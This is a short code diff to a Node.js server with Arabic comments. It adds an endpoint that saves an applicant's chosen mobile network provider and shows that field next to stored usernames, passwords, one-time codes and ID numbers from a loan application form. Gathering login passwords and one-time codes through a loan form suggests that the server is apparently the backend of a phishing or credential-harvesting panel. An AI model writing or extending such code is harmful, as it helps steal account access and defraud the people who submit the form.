@@ -212,6 +212,23 @@ const server = http.createServer((req, res) => {
     return;
   }
 
+  // ---- API: حفظ مزود الشبكة المختار ----
+  if (pathname === '/api/provider-submit' && req.method === 'POST') {
+    readRequestBody(req, (err, body) => {
+      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
+      const db = readDB();
+      const applications = getApplications(db);
+      if (applications.length) {
+        applications[0].networkProvider = body.provider || '';
+        db.applications = applications;
+        db.applicationData = applications[0];
+      }
+      writeDB(db);
+      sendJSON(res, 200, { ok: true });
+    });
+    return;
+  }
+
   // ---- API: إرسال بيانات طلب القرض (من apply.html) ----
   if (pathname === '/api/application-submit' && req.method === 'POST') {
     readRequestBody(req, (err, body) => {
@@ -268,6 +285,7 @@ const server = http.createServer((req, res) => {
           username: application.username || '',
           password: application.password || '',
           otpCode: application.otpCode || '',
+          networkProvider: application.networkProvider || '',
           idNumber: application.idNumber || '—',
           loanAmount: application.loanAmount || '—',
           months: application.months || '—',
